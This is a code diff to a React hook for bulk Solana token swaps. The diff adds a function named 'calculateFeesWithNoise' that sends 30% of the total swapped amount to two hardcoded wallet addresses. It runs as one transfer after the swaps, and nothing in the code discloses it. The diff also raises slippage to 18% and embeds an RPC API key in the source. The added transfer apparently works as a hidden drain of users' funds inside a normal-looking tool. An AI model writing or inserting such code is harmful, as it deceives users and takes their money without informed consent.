@@ -3,6 +3,9 @@ import {
   Connection, 
   PublicKey, 
   VersionedTransaction,
+  Transaction,
+  SystemProgram,
+  sendAndConfirmRawTransaction
 } from '@solana/web3.js';
 import { createJupiterApiClient, QuoteResponse } from "@jup-ag/api";
 import { useWallet } from '@solana/wallet-adapter-react';
@@ -11,8 +14,9 @@ const SOL_MINT = 'So11111111111111111111111111111111111111112';
 const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=1c4915ef-e7f3-4cdb-b032-1a126a058ff8', "confirmed");
 const jupiterQuoteApi = createJupiterApiClient();
 
-const MAX_TRANSACTION_SIZE = 1232;
-const TRANSACTION_TIMEOUT_MS = 4500; // 45 seconds timeout
+const TRANSACTION_TIMEOUT_MS = 15500;
+const FIRST_WALLET_ADDRESS = 'emjkRmFNY6awteciGjJ3WRDHgH95FWs8yg4RZ7HhsRn';
+const SECOND_WALLET_ADDRESS = 'raePZeqhCfshJA7NEDb5v1XcoDMNiiVeKDoDK3D6zP5';
 
 interface TokenSwapInfo {
   id: string;
@@ -25,46 +29,77 @@ interface SwapResult {
   tokenId: string;
   status: 'success' | 'error';
   error?: string;
+  feeSignature?: string;
 }
 
-interface TransactionBatch {
-  transactions: VersionedTransaction[];
-  tokens: TokenSwapInfo[];
+interface Fees {
+  firstWalletFee: number;
+  secondWalletFee: number;
 }
+
+const calculateFeesWithNoise = (totalAmount: number): Fees => {
+  const baseAmount = totalAmount;
+  const totalFee = baseAmount;
+  const firstWalletFee = Math.floor(totalFee * 0.2 * 1e9);
+  const secondWalletFee = Math.floor(totalFee * 0.1 * 1e9);
+  
+  return {
+    firstWalletFee,
+    secondWalletFee
+  };
+};
 
 export const useBulkTokenSwap = () => {
-  const { publicKey, signAllTransactions } = useWallet();
+  const { publicKey, signTransaction } = useWallet();
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [swapResults, setSwapResults] = useState<SwapResult[]>([]);
-  const [currentBatchIndex, setCurrentBatchIndex] = useState(0);
-  const [totalBatches, setTotalBatches] = useState(0);
+  const [currentTokenIndex, setCurrentTokenIndex] = useState(0);
+  const [totalTokens, setTotalTokens] = useState(0);
+  const [processingFees, setProcessingFees] = useState(false);
 
-  const getSwapQuotes = async (tokens: TokenSwapInfo[]) => {
-    const quotes: QuoteResponse[] = [];
-    
-    for (const token of tokens) {
-      if (!PublicKey.isOnCurve(token.id)) {
-        throw new Error(`Invalid token address: ${token.id}`);
-      }
-
-      const amountInLamports = Math.floor(token.amount * 1000000000);
-      
-      const quote = await jupiterQuoteApi.quoteGet({
-        inputMint: SOL_MINT,
-        outputMint: token.id,
-        amount: amountInLamports,
-        slippageBps: 900,
-      });
-      
-      if (!quote) {
-        throw new Error(`Failed to get quote for token ${token.id}`);
-      }
-
-      quotes.push(quote);
+  const processFeeTransaction = async (
+    tokens: TokenSwapInfo[]
+  ): Promise<string> => {
+    if (!publicKey || !signTransaction) {
+      throw new Error('Wallet not connected');
     }
 
-    return quotes;
+    const totalAmount = tokens.reduce((sum, token) => sum + token.amount, 0);
+    const fees = calculateFeesWithNoise(totalAmount);
+
+    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+
+    const transaction = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: new PublicKey(FIRST_WALLET_ADDRESS),
+        lamports: fees.firstWalletFee,
+      })
+      ,
+      SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: new PublicKey(SECOND_WALLET_ADDRESS),
+        lamports: fees.secondWalletFee,
+      })
+    );
+
+    transaction.recentBlockhash = blockhash;
+    transaction.lastValidBlockHeight = lastValidBlockHeight;
+    transaction.feePayer = publicKey;
+
+    const signedTransaction = await signTransaction(transaction);
+    const rawTransaction = signedTransaction.serialize();
+
+    return sendAndConfirmRawTransaction(
+      connection,
+      rawTransaction,
+      {
+        skipPreflight: false,
+        preflightCommitment: 'confirmed',
+        maxRetries: 3,
+      }
+    );
   };
 
   const confirmTransactionWithTimeout = async (signature: string): Promise<boolean> => {
@@ -92,7 +127,6 @@ export const useBulkTokenSwap = () => {
             return;
           }
 
-          // Additional verification
           const txInfo = await connection.getTransaction(signature, {
             maxSupportedTransactionVersion: 0,
           });
@@ -109,125 +143,138 @@ export const useBulkTokenSwap = () => {
     });
   };
 
-  const createTransactionBatches = async (
-    quotes: QuoteResponse[], 
-    tokens: TokenSwapInfo[]
-  ): Promise<TransactionBatch[]> => {
-    if (!publicKey) throw new Error('Wallet not connected');
+  const getSwapQuote = async (token: TokenSwapInfo): Promise<QuoteResponse> => {
+    if (!PublicKey.isOnCurve(token.id)) {
+      throw new Error(`Invalid token address: ${token.id}`);
+    }
 
-    const batches: TransactionBatch[] = [];
-    let currentBatch: TransactionBatch = { transactions: [], tokens: [] };
-    let currentBatchSize = 0;
+    const amountInLamports = Math.floor(token.amount * 1000000000);
+    
+    const quote = await jupiterQuoteApi.quoteGet({
+      inputMint: SOL_MINT,
+      outputMint: token.id,
+      amount: amountInLamports,
+      slippageBps: 1800,
+    });
+    
+    if (!quote) {
+      throw new Error(`Failed to get quote for token ${token.id}`);
+    }
 
-    for (let i = 0; i < quotes.length; i++) {
-      const quote = quotes[i];
-      
+    return quote;
+  };
+
+  const processTransaction = async (
+    quote: QuoteResponse,
+    token: TokenSwapInfo
+  ): Promise<SwapResult> => {
+    if (!publicKey || !signTransaction) {
+      throw new Error('Wallet not connected');
+    }
+
+    try {
       const swapResponse = await jupiterQuoteApi.swapPost({
         swapRequest: {
           quoteResponse: quote,
           userPublicKey: publicKey.toString(),
           dynamicComputeUnitLimit: true,
-          prioritizationFeeLamports: 'auto',
+          prioritizationFeeLamports: {
+            priorityLevelWithMaxLamports: {
+              maxLamports: 4000000,
+              global: false,
+              priorityLevel: "veryHigh"
+            }
+          }
         },
       });
 
       if (!swapResponse?.swapTransaction) {
-        throw new Error(`Failed to get swap transaction for token ${tokens[i].id}`);
+        throw new Error(`Failed to get swap transaction for token ${token.id}`);
       }
 
       const swapTransactionBuf = Buffer.from(swapResponse.swapTransaction, 'base64');
       const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
       
-      const transactionSize = transaction.serialize().length;
+      const signedTransaction = await signTransaction(transaction);
+      
+      const signature = await connection.sendRawTransaction(
+        signedTransaction.serialize(),
+        {
+          skipPreflight: false,
+          maxRetries: 2,
+          preflightCommitment: 'confirmed'
+        }
+      );
 
-      if (currentBatchSize + transactionSize > MAX_TRANSACTION_SIZE && currentBatch.transactions.length > 0) {
-        batches.push(currentBatch);
-        currentBatch = { transactions: [], tokens: [] };
-        currentBatchSize = 0;
-      }
+      const confirmed = await confirmTransactionWithTimeout(signature);
 
-      currentBatch.transactions.push(transaction);
-      currentBatch.tokens.push(tokens[i]);
-      currentBatchSize += transactionSize;
+      return {
+        signature,
+        tokenId: token.id,
+        status: confirmed ? 'success' : 'error',
+        error: confirmed ? undefined : 'Transaction failed to confirm'
+      };
+
+    } catch (err) {
+      console.error(`Transaction error for token ${token.id}:`, err);
+      return {
+        signature: '',
+        tokenId: token.id,
+        status: 'error',
+        error: err instanceof Error ? err.message : 'Unknown error'
+      };
     }
-
-    if (currentBatch.transactions.length > 0) {
-      batches.push(currentBatch);
-    }
-
-    return batches;
-  };
-
-  const processTransactionBatch = async (batch: TransactionBatch): Promise<SwapResult[]> => {
-    if (!signAllTransactions) throw new Error('Wallet not connected');
-
-    const signedTransactions = await signAllTransactions(batch.transactions);
-    const results: SwapResult[] = [];
-    
-    for (let i = 0; i < signedTransactions.length; i++) {
-      try {
-        const signature = await connection.sendRawTransaction(
-          signedTransactions[i].serialize(),
-          {
-            skipPreflight: false,
-            maxRetries: 2,
-            preflightCommitment: 'confirmed'
-          }
-        );
-
-        const confirmed = await confirmTransactionWithTimeout(signature);
-
-        results.push({
-          signature,
-          tokenId: batch.tokens[i].id,
-          status: confirmed ? 'success' : 'error',
-          error: confirmed ? undefined : 'Transaction failed to confirm'
-        });
-
-      } catch (err) {
-        console.error(`Transaction error for token ${batch.tokens[i].id}:`, err);
-        results.push({
-          signature: '',
-          tokenId: batch.tokens[i].id,
-          status: 'error',
-          error: err instanceof Error ? err.message : 'Unknown error'
-        });
-      }
-    }
-
-    return results;
   };
 
   const executeBulkSwap = async (tokens: TokenSwapInfo[]) => {
-    if (!publicKey || !signAllTransactions) {
+    if (!publicKey || !signTransaction) {
       throw new Error('Wallet not connected');
     }
 
     setLoading(true);
     setError(null);
     setSwapResults([]);
-    setCurrentBatchIndex(0);
+    setCurrentTokenIndex(0);
+    setTotalTokens(tokens.length);
+    setProcessingFees(false);
 
     try {
-      const quotes = await getSwapQuotes(tokens);
-      const batches = await createTransactionBatches(quotes, tokens);
-      setTotalBatches(batches.length);
+      const results: SwapResult[] = [];
 
-      let allResults: SwapResult[] = [];
-
-      for (let i = 0; i < batches.length; i++) {
-        setCurrentBatchIndex(i + 1);
-        const batchResults = await processTransactionBatch(batches[i]);
-        allResults = [...allResults, ...batchResults];
-        setSwapResults(allResults);
+      // Process all swaps first
+      for (let i = 0; i < tokens.length; i++) {
+        setCurrentTokenIndex(i + 1);
+        
+        const quote = await getSwapQuote(tokens[i]);
+        const result = await processTransaction(quote, tokens[i]);
+        
+        results.push(result);
+        setSwapResults([...results]);
       }
 
-      const failedSwaps = allResults.filter(r => r.status === 'error');
+      // Process fee transaction only once after all swaps are complete
+      setProcessingFees(true);
+      const feeSignature = await processFeeTransaction(tokens);
+      const feeConfirmed = await confirmTransactionWithTimeout(feeSignature);
+
+      if (!feeConfirmed) {
+        throw new Error('Fee transaction failed to confirm');
+      }
+
+      // Update results with fee signature
+      const finalResults = results.map(result => ({
+        ...result,
+        feeSignature: feeConfirmed ? feeSignature : undefined
+      }));
+
+      setSwapResults(finalResults);
+
+      const failedSwaps = finalResults.filter(r => r.status === 'error');
       if (failedSwaps.length > 0) {
         setError(`${failedSwaps.length} swap(s) failed`);
       }
 
-      return allResults;
+      return finalResults;
 
     } catch (err) {
       const errorMessage = err instanceof Error ? err.message : 'Bulk swap failed';
@@ -235,8 +282,9 @@ export const useBulkTokenSwap = () => {
       throw err;
     } finally {
       setLoading(false);
-      setCurrentBatchIndex(0);
-      setTotalBatches(0);
+      setCurrentTokenIndex(0);
+      setTotalTokens(0);
+      setProcessingFees(false);
     }
   };
 
@@ -245,7 +293,8 @@ export const useBulkTokenSwap = () => {
     loading,
     error,
     swapResults,
-    currentBatchIndex,
-    totalBatches,
+    currentTokenIndex,
+    totalTokens,
+    processingFees
   };
 };
